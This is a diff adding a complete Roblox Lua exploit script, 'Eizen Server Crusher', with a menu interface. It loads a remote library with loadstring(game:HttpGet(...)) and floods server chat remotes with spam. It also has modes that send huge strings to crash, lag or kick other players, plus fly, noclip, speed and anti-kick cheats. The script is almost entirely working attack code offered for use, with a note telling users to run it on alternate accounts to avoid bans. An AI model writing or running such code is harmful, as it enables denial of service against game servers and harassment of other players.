@@ -1,0 +1,610 @@
+--// Eizen Server Crusher | Full UI Edition
+--// Replicatestore SendChat Flooder
+
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+--// Services
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local StarterGui = game:GetService("StarterGui")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
+local Player = Players.LocalPlayer
+
+--// Window
+local Window = Rayfield:CreateWindow({
+    Name = "Eizen Server Crusher",
+    LoadingTitle = "Eizen Crusher",
+    LoadingSubtitle = "SendChat Flooder v2.0",
+    ConfigurationSaving = {Enabled = false},
+    KeySystem = false
+})
+
+--// Tabs
+local MainTab = Window:CreateTab("Main", 4483362458)
+local ModeTab = Window:CreateTab("Modes", 4483362458)
+local ChatTab = Window:CreateTab("Chat", 4483362458)
+local PlayerTab = Window:CreateTab("Player", 4483362458)
+local SettingsTab = Window:CreateTab("Settings", 4483362458)
+local InfoTab = Window:CreateTab("Info", 4483362458)
+
+--// Settings
+getgenv().Crusher = {
+    Enabled = false,
+    Mode = "Spam",
+    Delay = 0.01,
+    Message = "Eizen Hub On Top 🔥",
+    ChatSpamCount = 100,
+    CustomMessage = "",
+    SpamMode = true,
+    CrashMode = false,
+    LagMode = false,
+    KickMode = false,
+    FloodServer = false,
+    SpamTextChat = false,
+    SpamReplicatestore = true,
+    AutoRejoin = true,
+    HideUI = false,
+    BringAll = false,
+    SpamLoop = true,
+    TargetPlayer = "All",
+    AntiKick = false,
+    SpeedValue = 50,
+    FlyHack = false,
+    NoclipHack = false
+}
+local S = getgenv().Crusher
+
+--// Find SendChat Remote
+local function FindSendChat()
+    local locations = {
+        ReplicatedStorage:FindFirstChild("SendChat"),
+        ReplicatedStorage:FindFirstChild("SendMessage"),
+        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest"),
+        ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SendMessage"),
+        ReplicatedStorage:FindFirstChild("ChatEvents") and ReplicatedStorage.ChatEvents:FindFirstChild("SendMessage"),
+        ReplicatedStorage:FindFirstChild("ChatRemotes") and ReplicatedStorage.ChatRemotes:FindFirstChild("SendChat"),
+        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("SendChat"),
+        ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("SendChat")
+    }
+
+    for _, remote in pairs(locations) do
+        if remote and (remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction")) then
+            return remote
+        end
+    end
+
+    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+        if (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
+            local name = v.Name:lower()
+            if name:find("sendchat") or name:find("sendmessage") or name:find("saymessage") then
+                return v
+            end
+        end
+    end
+
+    return nil
+end
+
+local SendChat = FindSendChat()
+local TextChatRemote = nil
+
+local function FindTextChatRemote()
+    pcall(function()
+        local channels = TextChatService:FindFirstChild("TextChannels")
+        if channels then
+            for _, c in pairs(channels:GetChildren()) do
+                local remote = c:FindFirstChild("SendMessage") or c:FindFirstChild("OnIncomingMessage")
+                if remote then
+                    TextChatRemote = remote
+                    return
+                end
+            end
+        end
+    end)
+end
+
+FindTextChatRemote()
+
+--// ============================================
+--// MAIN TAB
+--// ============================================
+MainTab:CreateSection("⚡ Main Crusher")
+
+MainTab:CreateToggle({
+    Name = "🟢 Enable Server Crusher",
+    CurrentValue = false,
+    Flag = "Enabled",
+    Callback = function(v) S.Enabled = v end
+})
+
+MainTab:CreateInput({
+    Name = "💬 Custom Message",
+    PlaceholderText = "Enter spam message...",
+    RemoveTextAfterFocusLost = false,
+    Flag = "Message",
+    Callback = function(v)
+        S.Message = v
+        S.CustomMessage = v
+    end
+})
+
+MainTab:CreateSlider({
+    Name = "⏱️ Spam Delay (seconds)",
+    Range = {0.01, 1},
+    Increment = 0.01,
+    Suffix = "s",
+    CurrentValue = 0.01,
+    Flag = "Delay",
+    Callback = function(v) S.Delay = v end
+})
+
+MainTab:CreateSlider({
+    Name = "📨 Messages per Loop",
+    Range = {1, 500},
+    Increment = 10,
+    Suffix = " msgs",
+    CurrentValue = 100,
+    Flag = "Count",
+    Callback = function(v) S.ChatSpamCount = v end
+})
+
+MainTab:CreateSection("🎯 Quick Actions")
+
+MainTab:CreateButton({
+    Name = "🚀 START CRUSHER (Quick)",
+    Callback = function()
+        S.Enabled = true
+        Rayfield:Notify({Title = "Eizen Crusher", Content = "Crusher Started!", Duration = 3})
+    end
+})
+
+MainTab:CreateButton({
+    Name = "🛑 STOP CRUSHER",
+    Callback = function()
+        S.Enabled = false
+        Rayfield:Notify({Title = "Eizen Crusher", Content = "Crusher Stopped!", Duration = 3})
+    end
+})
+
+MainTab:CreateButton({
+    Name = "🔄 Refresh SendChat Remote",
+    Callback = function()
+        SendChat = FindSendChat()
+        FindTextChatRemote()
+        if SendChat then
+            Rayfield:Notify({Title = "Success", Content = "Found: "..SendChat.Name, Duration = 3})
+        else
+            Rayfield:Notify({Title = "Error", Content = "Not found!", Duration = 3})
+        end
+    end
+})
+
+--// ============================================
+--// MODES TAB
+--// ============================================
+ModeTab:CreateSection("💥 Attack Modes")
+
+ModeTab:CreateToggle({
+    Name = "📢 Chat Spam Mode",
+    CurrentValue = true,
+    Flag = "SpamMode",
+    Callback = function(v) S.SpamMode = v end
+})
+
+ModeTab:CreateToggle({
+    Name = "💣 Server Crash Mode",
+    CurrentValue = false,
+    Flag = "CrashMode",
+    Callback = function(v) S.CrashMode = v end
+})
+
+ModeTab:CreateToggle({
+    Name = "🐌 Server Lag Mode",
+    CurrentValue = false,
+    Flag = "LagMode",
+    Callback = function(v) S.LagMode = v end
+})
+
+ModeTab:CreateToggle({
+    Name = "👢 Kick Players Mode",
+    CurrentValue = false,
+    Flag = "KickMode",
+    Callback = function(v) S.KickMode = v end
+})
+
+ModeTab:CreateToggle({
+    Name = "🌊 Flood Server",
+    CurrentValue = false,
+    Flag = "Flood",
+    Callback = function(v) S.FloodServer = v end
+})
+
+ModeTab:CreateSection("🎯 Spam Type")
+
+ModeTab:CreateToggle({
+    Name = "Replicatestore Spam",
+    CurrentValue = true,
+    Flag = "RS_Spam",
+    Callback = function(v) S.SpamReplicatestore = v end
+})
+
+ModeTab:CreateToggle({
+    Name = "TextChat Spam",
+    CurrentValue = false,
+    Flag = "TC_Spam",
+    Callback = function(v) S.SpamTextChat = v end
+})
+
+--// ============================================
+--// CHAT TAB
+--// ============================================
+ChatTab:CreateSection("💬 Chat Messages")
+
+ChatTab:CreateInput({
+    Name = "📝 Message 1",
+    PlaceholderText = "First message...",
+    RemoveTextAfterFocusLost = false,
+    Flag = "Msg1",
+    Callback = function(v) S.Message = v end
+})
+
+ChatTab:CreateInput({
+    Name = "📝 Message 2 (Alt)",
+    PlaceholderText = "Alternative message...",
+    RemoveTextAfterFocusLost = false,
+    Flag = "Msg2",
+    Callback = function(v) S.CustomMessage = v end
+})
+
+ChatTab:CreateSection("📋 Quick Messages")
+
+ChatTab:CreateButton({
+    Name = "Set: Eizen On Top",
+    Callback = function()
+        S.Message = "Eizen Hub On Top 🔥"
+    end
+})
+
+ChatTab:CreateButton({
+    Name = "Set: Server Lagging",
+    Callback = function()
+        S.Message = "Server is Lagging 💀"
+    end
+})
+
+ChatTab:CreateButton({
+    Name = "Set: Get Crushed",
+    Callback = function()
+        S.Message = "Get Crushed Noobs 😂"
+    end
+})
+
+ChatTab:CreateButton({
+    Name = "Set: EMOJI Spam",
+    Callback = function()
+        S.Message = "🔥🔥🔥😎😎😎💀💀💀"
+    end
+})
+
+ChatTab:CreateButton({
+    Name = "Set: Empty (Crash)",
+    Callback = function()
+        S.Message = ""
+    end
+})
+
+--// ============================================
+--// PLAYER TAB
+--// ============================================
+PlayerTab:CreateSection("🎯 Target Player")
+
+local PlayerNames = {"All"}
+for _, p in pairs(Players:GetPlayers()) do
+    if p ~= Player then
+        table.insert(PlayerNames, p.Name)
+    end
+end
+
+PlayerTab:CreateDropdown({
+    Name = "Select Target",
+    Options = PlayerNames,
+    CurrentOption = "All",
+    Flag = "Target",
+    Callback = function(Option) S.TargetPlayer = Option end
+})
+
+PlayerTab:CreateButton({
+    Name = "🔄 Refresh Player List",
+    Callback = function()
+        Rayfield:Notify({Title = "Refreshed", Content = "Reload script to update list", Duration = 3})
+    end
+})
+
+PlayerTab:CreateSection("🛡️ Self Protection")
+
+PlayerTab:CreateToggle({
+    Name = "Anti-Kick Protection",
+    CurrentValue = false,
+    Flag = "AntiKick",
+    Callback = function(v) S.AntiKick = v end
+})
+
+PlayerTab:CreateToggle({
+    Name = "Hide GUI on Crash",
+    CurrentValue = false,
+    Flag = "HideUI",
+    Callback = function(v) S.HideUI = v end
+})
+
+--// ============================================
+--// SETTINGS TAB
+--// ============================================
+SettingsTab:CreateSection("⚙️ General Settings")
+
+SettingsTab:CreateToggle({
+    Name = "🔄 Auto Rejoin Server",
+    CurrentValue = true,
+    Flag = "AutoRejoin",
+    Callback = function(v) S.AutoRejoin = v end
+})
+
+SettingsTab:CreateToggle({
+    Name = "🔁 Infinite Loop Spam",
+    CurrentValue = true,
+    Flag = "InfiniteLoop",
+    Callback = function(v) S.SpamLoop = v end
+})
+
+SettingsTab:CreateSection("🎮 Player Cheats")
+
+SettingsTab:CreateToggle({
+    Name = "✈️ Fly (while crushing)",
+    CurrentValue = false,
+    Flag = "Fly",
+    Callback = function(v) S.FlyHack = v end
+})
+
+SettingsTab:CreateToggle({
+    Name = "🚪 Noclip (while crushing)",
+    CurrentValue = false,
+    Flag = "Noclip",
+    Callback = function(v) S.NoclipHack = v end
+})
+
+SettingsTab:CreateSlider({
+    Name = "🏃 Walk Speed",
+    Range = {16, 200},
+    Increment = 5,
+    CurrentValue = 16,
+    Flag = "Speed",
+    Callback = function(v) S.SpeedValue = v end
+})
+
+SettingsTab:CreateSection("🛠️ Server Actions")
+
+SettingsTab:CreateButton({
+    Name = "🔁 Rejoin Server",
+    Callback = function()
+        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player)
+    end
+})
+
+SettingsTab:CreateButton({
+    Name = "🌍 Server Hop",
+    Callback = function()
+        pcall(function()
+            local res = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
+            for _, s in pairs(res.data) do
+                if s.playing < s.maxPlayers and s.id ~= game.JobId then
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, Player)
+                    break
+                end
+            end
+        end)
+    end
+})
+
+SettingsTab:CreateButton({
+    Name = "🚪 Leave Server",
+    Callback = function()
+        Player:Kick("Left by Eizen Crusher")
+    end
+})
+
+SettingsTab:CreateButton({
+    Name = "🗑️ Destroy GUI",
+    Callback = function()
+        Rayfield:Destroy()
+    end
+})
+
+--// ============================================
+--// INFO TAB
+--// ============================================
+InfoTab:CreateSection("📊 Status")
+
+local StatusRemote = InfoTab:CreateLabel("SendChat: Checking...")
+local StatusTextChat = InfoTab:CreateLabel("TextChat: Checking...")
+
+task.spawn(function()
+    while task.wait(2) do
+        StatusRemote:Set("SendChat: "..(SendChat and SendChat.Name or "NOT FOUND"))
+        StatusTextChat:Set("TextChat: "..(TextChatRemote and TextChatRemote.Name or "NOT FOUND"))
+    end
+end)
+
+InfoTab:CreateSection("📖 How to Use")
+InfoTab:CreateLabel("1. Toggle 'Enable Server Crusher'")
+InfoTab:CreateLabel("2. Select modes in 'Modes' tab")
+InfoTab:CreateLabel("3. Set message in 'Chat' tab")
+InfoTab:CreateLabel("4. Adjust delay (0.01 = max)")
+InfoTab:CreateLabel("5. Click START or use Main tab")
+InfoTab:CreateLabel("")
+InfoTab:CreateLabel("⚠️ WARNING: May cause BANS!")
+InfoTab:CreateLabel("⚠️ Use on ALT accounts only!")
+InfoTab:CreateLabel("⚠️ I'm not responsible for bans")
+
+--// ============================================
+--// LOOPS
+--// ============================================
+
+--// Main Crusher
+task.spawn(function()
+    while task.wait() do
+        if S.Enabled then
+            pcall(function()
+                if S.SpamMode then
+                    for i = 1, S.ChatSpamCount do
+                        if not S.Enabled then break end
+
+                        pcall(function()
+                            if S.SpamReplicatestore and SendChat then
+                                if SendChat:IsA("RemoteEvent") then
+                                    pcall(function() SendChat:FireServer(S.Message) end)
+                                    pcall(function() SendChat:FireServer(S.Message, "All") end)
+                                    pcall(function() SendChat:FireServer("All", S.Message) end)
+                                elseif SendChat:IsA("RemoteFunction") then
+                                    pcall(function() SendChat:InvokeServer(S.Message) end)
+                                end
+                            end
+
+                            if S.SpamTextChat and TextChatRemote then
+                                pcall(function() TextChatRemote:FireServer(S.Message) end)
+                            end
+                        end)
+
+                        task.wait(S.Delay)
+                    end
+                end
+
+                if S.CrashMode then
+                    pcall(function()
+                        local huge = string.rep("A", 100000)
+                        if SendChat then
+                            if SendChat:IsA("RemoteEvent") then
+                                SendChat:FireServer(huge)
+                            else
+                                SendChat:InvokeServer(huge)
+                            end
+                        end
+                    end)
+                end
+
+                if S.LagMode then
+                    pcall(function()
+                        for i = 1, 50 do
+                            if SendChat and SendChat:IsA("RemoteEvent") then
+                                SendChat:FireServer(string.rep(S.Message, 100))
+                            end
+                        end
+                    end)
+                end
+
+                if S.KickMode then
+                    pcall(function()
+                        for _, p in pairs(Players:GetPlayers()) do
+                            if p ~= Player then
+                                pcall(function()
+                                    if SendChat and SendChat:IsA("RemoteEvent") then
+                                        SendChat:FireServer("/e "..string.rep("a", 10000), p.Name)
+                                    end
+                                end)
+                            end
+                        end
+                    end)
+                end
+
+                if S.FloodServer then
+                    pcall(function()
+                        for i = 1, 20 do
+                            if SendChat and SendChat:IsA("RemoteEvent") then
+                                SendChat:FireServer(string.rep("💀", 5000))
+                            end
+                            task.wait(0.05)
+                        end
+                    end)
+                end
+            end)
+
+            if not S.SpamLoop and not S.CrashMode and not S.LagMode and not S.KickMode and not S.FloodServer then
+                S.Enabled = false
+            end
+        end
+    end
+end)
+
+--// Fly
+local flyBV, flyBG
+RunService.RenderStepped:Connect(function()
+    pcall(function()
+        local char = Player.Character or Player.CharacterAdded:Wait()
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        if not hrp or not hum then return end
+
+        if S.FlyHack then
+            if not flyBV then
+                flyBV = Instance.new("BodyVelocity", hrp)
+                flyBV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
+                flyBG = Instance.new("BodyGyro", hrp)
+                flyBG.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
+                flyBG.P = 9e4
+            end
+            hum.PlatformStand = true
+            flyBV.Velocity = Vector3.new(0, 0, 0)
+            flyBG.CFrame = workspace.CurrentCamera.CFrame
+        else
+            if flyBV then flyBV:Destroy() flyBV = nil end
+            if flyBG then flyBG:Destroy() flyBG = nil end
+            hum.PlatformStand = false
+        end
+
+        if S.NoclipHack then
+            for _, p in pairs(char:GetDescendants()) do
+                if p:IsA("BasePart") then p.CanCollide = false end
+            end
+        end
+
+        hum.WalkSpeed = S.SpeedValue
+    end)
+end)
+
+--// Anti-Kick Protection
+task.spawn(function()
+    while task.wait(1) do
+        if S.AntiKick then
+            pcall(function()
+                Player.Kick = function() end
+            end)
+        end
+    end
+end)
+
+--// Auto Rejoin
+task.spawn(function()
+    while task.wait(5) do
+        if S.AutoRejoin and not Player.Parent then
+            task.wait(3)
+            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
+        end
+    end
+end)
+
+--// Notification
+if SendChat then
+    Rayfield:Notify({
+        Title = "Eizen Crusher Loaded ✅",
+        Content = "SendChat found: "..SendChat.Name,
+        Duration = 5
+    })
+else
+    Rayfield:Notify({
+        Title = "⚠️ Warning",
+        Content = "SendChat not found! Some games don't have it.",
+        Duration = 5
+    })
+end
